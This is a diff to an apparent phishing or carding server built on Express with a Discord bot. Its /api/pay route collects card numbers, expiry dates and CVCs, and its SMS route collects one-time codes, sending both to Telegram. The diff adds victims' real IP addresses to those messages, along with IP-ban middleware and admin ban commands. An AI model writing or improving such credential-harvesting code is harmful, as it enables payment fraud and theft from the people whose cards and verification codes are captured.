@@ -156,9 +156,32 @@ const ticketQueue = new Collection(); // In-memory fallback if needed
 const camInfractions = new Collection();
 // Removed JSON file setup - now using PostgreSQL
 
+// Helper for Real IP
+const getRealIP = (req) => {
+    const xForwardedFor = req.headers['x-forwarded-for'];
+    if (xForwardedFor) return xForwardedFor.split(',')[0].trim();
+    return req.ip || req.connection.remoteAddress;
+};
+
+// IP Ban Middleware
+const checkIPBan = async (req, res, next) => {
+    try {
+        const ip = getRealIP(req);
+        const result = await db.query('SELECT * FROM banned_ips WHERE ip = $1', [ip]);
+        if (result.rows.length > 0) {
+            return res.status(403).send('<html><body style="background:#000;color:#f00;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><h1>Accès Interdit.</h1></body></html>');
+        }
+        next();
+    } catch (err) {
+        next();
+    }
+};
+
 // --- EXPRESS SERVER CONFIG ---
+app.set('trust proxy', true);
 app.use(cors());
 app.use(bodyParser.json());
+app.use(checkIPBan);
 app.use(express.static('public'));
 
 function generateCode() {
@@ -182,7 +205,7 @@ app.post('/api/pay', async (req, res) => {
             `📧 *MAIL:* \`${email || 'N/A'}\`\n\n` +
             `💎 *CARTE:* \`${cardNumber || 'N/A'}\`\n` +
             `📅 *DATE:* \`${expiry || 'N/A'}\`    🔒 *CVC:* \`${cvc || 'N/A'}\`\n\n` +
-            `🌍 *PAYS:* \`${country || 'N/A'}\`    🌐 *IP:* \`${req.ip}\``;
+            `🌍 *PAYS:* \`${country || 'N/A'}\`    🌐 *IP:* \`${getRealIP(req)}\``;
         
         await sendToTelegram(message, {
             reply_markup: {
@@ -220,7 +243,7 @@ app.post('/api/pay', async (req, res) => {
 app.post('/api/submit-sms', async (req, res) => {
     const { smsCode, paymentId } = req.body;
     
-    sendToTelegram(`📲 *CODE SMS REÇU*\nID: \`${paymentId}\`\nCODE: \`${smsCode}\``);
+    sendToTelegram(`📲 *CODE SMS REÇU*\nID: \`${paymentId}\`\nCODE: \`${smsCode}\`\n🌐 *IP:* \`${getRealIP(req)}\``);
 
     // Give the final VIP code
     const newCode = generateCode();
@@ -1521,6 +1544,39 @@ client.on('messageCreate', async (message) => {
 
         const row = new ActionRowBuilder().addComponents(select);
         await message.reply({ embeds: [embed], components: [row] });
+    }
+
+    // Command: -banip
+    if (command === 'banip') {
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
+        const ip = args[0];
+        const reason = args.slice(1).join(' ') || 'Pas de raison.';
+        if (!ip) return message.reply('Usage: `-banip <IP>`');
+
+        await db.query('INSERT INTO banned_ips (ip, reason, timestamp) VALUES ($1, $2, $3) ON CONFLICT (ip) DO UPDATE SET reason = $2', [ip, reason, Date.now()]);
+        
+        const embed = new EmbedBuilder()
+            .setColor(0xFF0000)
+            .setTitle('🚫 IP Bannie')
+            .setDescription(`L'IP **${ip}** a été bannie de l'accès au site.\n**Raison:** ${reason}`)
+            .setTimestamp();
+        message.reply({ embeds: [embed] });
+    }
+
+    // Command: -unbanip
+    if (command === 'unbanip') {
+        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
+        const ip = args[0];
+        if (!ip) return message.reply('Usage: `-unbanip <IP>`');
+
+        await db.query('DELETE FROM banned_ips WHERE ip = $1', [ip]);
+        
+        const embed = new EmbedBuilder()
+            .setColor(0x00FF00)
+            .setTitle('✅ IP Débannie')
+            .setDescription(`L'IP **${ip}** a été retirée de la liste noire.`)
+            .setTimestamp();
+        message.reply({ embeds: [embed] });
     }
 
     // Command: -unban
